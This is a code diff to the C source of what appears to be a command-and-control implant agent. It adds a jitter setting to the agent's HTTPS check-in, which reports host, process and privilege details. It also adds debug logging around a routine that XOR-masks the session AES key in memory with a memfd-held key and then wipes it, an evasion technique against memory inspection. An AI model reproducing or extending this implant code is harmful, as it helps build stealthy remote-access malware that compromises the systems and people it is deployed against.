@@ -125,6 +125,7 @@ extern int nax_build_reg_body(
     uint32_t os_major, uint32_t os_minor, uint16_t os_build,
     uint32_t parent_pid, uint32_t acp, uint32_t oem_cp,
     const char *img, uint32_t img_len,
+    uint8_t jitter_pct,
     uint8_t *out, uint32_t *out_len);
 extern void nax_gather_sysinfo(NaxSysInfo *info);
 
@@ -889,6 +890,7 @@ void nax_https_main(NaxAgent *a)
                     info.procname, strlen(info.procname), info.elevated,
                     info.os_major, info.os_minor, info.os_build,
                     info.ppid, 0, 0, info.imgpath, strlen(info.imgpath),
+                    (uint8_t)a->cfg.jitter_pct,
                     reg_body, &reg_body_len) < 0) { sleep(3); continue; }
 
             uint8_t *frame = (uint8_t *)malloc(NAX_IO_CAP);
@@ -1086,6 +1088,24 @@ void nax_https_main(NaxAgent *a)
                         if (key_fd >= 0)
                             write(key_fd, obf_key, NAX_OBF_KEY_LEN);
 
+                        /* DEBUG: state before encryption */
+#ifdef NAX_DEBUG
+                        {
+                            char hex[NAX_AES_KEY_SIZE * 2 + 1];
+                            for (uint32_t i = 0; i < NAX_AES_KEY_SIZE; i++)
+                                snprintf(hex + i*2, 3, "%02x", a->cfg.aes_key[i]);
+                            DBG("[obf-encrypt] aes_key before: %s", hex);
+                            char sidhex[NAX_SID_LEN * 2 + 1];
+                            for (uint32_t i = 0; i < NAX_SID_LEN; i++)
+                                snprintf(sidhex + i*2, 3, "%02x", (uint8_t)a->session_id[i]);
+                            DBG("[obf-encrypt] session_id before: %s (%s)", a->session_id, sidhex);
+                            char obfhex[NAX_OBF_KEY_LEN * 2 + 1];
+                            for (uint32_t i = 0; i < NAX_OBF_KEY_LEN; i++)
+                                snprintf(obfhex + i*2, 3, "%02x", obf_key[i]);
+                            DBG("[obf-encrypt] obf_key: %s", obfhex);
+                        }
+#endif
+
                         volatile uint8_t *kp = (volatile uint8_t *)a->cfg.aes_key;
                         for (uint32_t i = 0; i < NAX_AES_KEY_SIZE; i++)
                             kp[i] ^= obf_key[i % NAX_OBF_KEY_LEN];
@@ -1096,6 +1116,21 @@ void nax_https_main(NaxAgent *a)
                                 obf_key[(NAX_AES_KEY_SIZE + i) % NAX_OBF_KEY_LEN];
 
                         nax_profile_xor(obf_key, NAX_OBF_KEY_LEN);
+
+                        /* DEBUG: state after encryption */
+#ifdef NAX_DEBUG
+                        {
+                            char hex[NAX_AES_KEY_SIZE * 2 + 1];
+                            for (uint32_t i = 0; i < NAX_AES_KEY_SIZE; i++)
+                                snprintf(hex + i*2, 3, "%02x", a->cfg.aes_key[i]);
+                            DBG("[obf-encrypt] aes_key after (obfuscated): %s", hex);
+                            char sidhex[NAX_SID_LEN * 2 + 1];
+                            for (uint32_t i = 0; i < NAX_SID_LEN; i++)
+                                snprintf(sidhex + i*2, 3, "%02x", (uint8_t)a->session_id[i]);
+                            DBG("[obf-encrypt] session_id after (obfuscated): %s", sidhex);
+                            DBG("[obf-encrypt] profile XOR applied, key_fd=%d", key_fd);
+                        }
+#endif
 
                         volatile uint8_t *zp = (volatile uint8_t *)obf_key;
                         for (uint32_t i = 0; i < NAX_OBF_KEY_LEN; i++) zp[i] = 0;
@@ -1110,6 +1145,24 @@ void nax_https_main(NaxAgent *a)
                         read(key_fd, restore_key, NAX_OBF_KEY_LEN);
                         close(key_fd);
 
+                        /* DEBUG: state before decryption */
+#ifdef NAX_DEBUG
+                        {
+                            char hex[NAX_AES_KEY_SIZE * 2 + 1];
+                            for (uint32_t i = 0; i < NAX_AES_KEY_SIZE; i++)
+                                snprintf(hex + i*2, 3, "%02x", a->cfg.aes_key[i]);
+                            DBG("[obf-decrypt] aes_key before restore (still obfuscated): %s", hex);
+                            char sidhex[NAX_SID_LEN * 2 + 1];
+                            for (uint32_t i = 0; i < NAX_SID_LEN; i++)
+                                snprintf(sidhex + i*2, 3, "%02x", (uint8_t)a->session_id[i]);
+                            DBG("[obf-decrypt] session_id before restore: %s", sidhex);
+                            char rkhex[NAX_OBF_KEY_LEN * 2 + 1];
+                            for (uint32_t i = 0; i < NAX_OBF_KEY_LEN; i++)
+                                snprintf(rkhex + i*2, 3, "%02x", restore_key[i]);
+                            DBG("[obf-decrypt] restore_key from memfd: %s", rkhex);
+                        }
+#endif
+
                         volatile uint8_t *kp = (volatile uint8_t *)a->cfg.aes_key;
                         for (uint32_t i = 0; i < NAX_AES_KEY_SIZE; i++)
                             kp[i] ^= restore_key[i % NAX_OBF_KEY_LEN];
@@ -1120,6 +1173,21 @@ void nax_https_main(NaxAgent *a)
                                 restore_key[(NAX_AES_KEY_SIZE + i) % NAX_OBF_KEY_LEN];
 
                         nax_profile_xor(restore_key, NAX_OBF_KEY_LEN);
+
+                        /* DEBUG: state after decryption */
+#ifdef NAX_DEBUG
+                        {
+                            char hex[NAX_AES_KEY_SIZE * 2 + 1];
+                            for (uint32_t i = 0; i < NAX_AES_KEY_SIZE; i++)
+                                snprintf(hex + i*2, 3, "%02x", a->cfg.aes_key[i]);
+                            DBG("[obf-decrypt] aes_key after restore (should match original): %s", hex);
+                            char sidhex[NAX_SID_LEN * 2 + 1];
+                            for (uint32_t i = 0; i < NAX_SID_LEN; i++)
+                                snprintf(sidhex + i*2, 3, "%02x", (uint8_t)a->session_id[i]);
+                            DBG("[obf-decrypt] session_id after restore: %s (%s)", a->session_id, sidhex);
+                            DBG("[obf-decrypt] profile XOR restored");
+                        }
+#endif
 
                         volatile uint8_t *zp = (volatile uint8_t *)restore_key;
                         for (uint32_t i = 0; i < NAX_OBF_KEY_LEN; i++) zp[i] = 0;
